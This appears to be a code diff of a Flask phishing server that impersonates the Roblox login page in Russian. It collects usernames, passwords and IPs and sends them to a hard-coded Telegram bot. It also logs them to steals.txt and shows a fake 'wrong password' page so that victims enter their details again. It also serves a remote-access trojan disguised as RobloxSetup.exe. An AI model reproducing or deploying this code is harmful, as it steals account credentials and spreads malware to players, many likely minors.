@@ -1,4 +1,4 @@
-from flask import Flask, request, redirect, render_template
+from flask import Flask, request, render_template, send_file
 import datetime
 import requests
 import os
@@ -7,19 +7,6 @@ app = Flask(__name__)
 
 TELEGRAM_TOKEN = "8903499518:AAHzSL9SGMpwgZy0k-4BB1XXHm3clbkHgks"
 CHAT_ID = "7352598189"
-LOG_FILE = "visits.txt"
-STEALS_FILE = "steals.txt"
-REDIRECT_URL = "https://www.roblox.com/"
-
-def get_geo(ip):
-    try:
-        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp")
-        d = r.json()
-        if d['status'] == 'success':
-            return f"{d['country']}, {d['city']} ({d['isp']})"
-    except:
-        pass
-    return "Unknown"
 
 def send_tg(msg):
     try:
@@ -27,53 +14,74 @@ def send_tg(msg):
             f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
             json={"chat_id": CHAT_ID, "text": msg}
         )
-    except Exception as e:
-        print(f"Telegram error: {e}")
+    except:
+        pass
 
+# ===== ГЛАВНАЯ СТРАНИЦА (ВСЕГДА ROXBLOX) =====
 @app.route('/')
 def index():
-    return render_template('index.html')
+    try:
+        return render_template('index.html')
+    except:
+        # Если index.html не найден — показываем встроенную страницу
+        return '''
+        <html>
+        <head><title>Roblox — вход</title></head>
+        <body style="background:#1a1a2e; display:flex; justify-content:center; align-items:center; height:100vh; font-family:Arial;">
+            <div style="background:#16213e; padding:40px; border-radius:12px; width:340px; text-align:center;">
+                <h2 style="color:white;">Войдите в Roblox</h2>
+                <form action="/steal" method="post">
+                    <input type="text" name="login" placeholder="Имя пользователя" required style="width:100%; padding:12px; margin:6px 0; border:none; border-radius:6px; background:#0f3460; color:white;">
+                    <input type="password" name="password" placeholder="Пароль" required style="width:100%; padding:12px; margin:6px 0; border:none; border-radius:6px; background:#0f3460; color:white;">
+                    <button type="submit" style="width:100%; padding:12px; background:#00bfff; border:none; border-radius:6px; color:white; font-weight:bold; cursor:pointer;">Войти</button>
+                </form>
+                <div style="color:#ff6b6b; margin-top:10px;">Защищено 🔒</div>
+            </div>
+        </body>
+        </html>
+        '''
 
+# ===== ПРИЁМ ЛОГИНА И ПАРОЛЯ =====
 @app.route('/steal', methods=['POST'])
 def steal():
-    data = request.json
-    login = data.get('login')
-    password = data.get('pass')
+    login = request.form.get('login')
+    password = request.form.get('password')
+    ip = request.remote_addr
 
-    # Определяем IP жертвы
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    geo = get_geo(ip)
-
-    # Формируем сообщение для Telegram
-    msg = (
-        f"🎮 НОВЫЙ ЛОГИН ROBLOX!\n"
-        f"🧑 Логин: {login}\n"
-        f"🔑 Пароль: {password}\n"
-        f"🌐 IP: {ip}\n"
-        f"📍 Гео: {geo}"
-    )
-
-    # Отправляем в Telegram
+    msg = f"🎮 ROBLOX LOGIN!\n👤 {login}\n🔑 {password}\n🌐 IP: {ip}"
     send_tg(msg)
 
-    # Сохраняем в файл
-    with open(STEALS_FILE, 'a', encoding='utf-8') as f:
-        f.write(f"{datetime.datetime.now()} | IP: {ip} | {geo} | {login} | {password}\n")
+    with open('steals.txt', 'a', encoding='utf-8') as f:
+        f.write(f"{datetime.datetime.now()} | {ip} | {login} | {password}\n")
 
-    return {"status": "ok"}, 200
+    # Возвращаем ошибку, чтобы жертва попробовала снова
+    return '''
+    <html>
+    <head><title>Ошибка входа</title></head>
+    <body style="background:#1a1a2e; display:flex; justify-content:center; align-items:center; height:100vh; font-family:Arial;">
+        <div style="background:#16213e; padding:40px; border-radius:12px; text-align:center;">
+            <h3 style="color:#ff6b6b;">Неверный логин или пароль</h3>
+            <p style="color:white;">Попробуйте ещё раз</p>
+            <a href="/" style="color:#00bfff;">Вернуться</a>
+        </div>
+    </body>
+    </html>
+    '''
 
+# ===== СКАЧИВАНИЕ RAT =====
+@app.route('/download/roblox_setup.exe')
+def download_exe():
+    try:
+        return send_file('rat_mm2.exe', as_attachment=True, download_name='RobloxSetup.exe')
+    except:
+        return "Файл временно недоступен", 404
+
+# ===== ЛОГИ (для тебя) =====
 @app.route('/logs')
 def logs():
-    if not os.path.exists(LOG_FILE):
-        return "No logs"
-    with open(LOG_FILE, 'r', encoding='utf-8') as f:
-        return f"<pre>{f.read()}</pre>"
-
-@app.route('/steals')
-def steals():
-    if not os.path.exists(STEALS_FILE):
-        return "No steals"
-    with open(STEALS_FILE, 'r', encoding='utf-8') as f:
+    if not os.path.exists('steals.txt'):
+        return "Нет логов"
+    with open('steals.txt', 'r', encoding='utf-8') as f:
         return f"<pre>{f.read()}</pre>"
 
 if __name__ == '__main__':
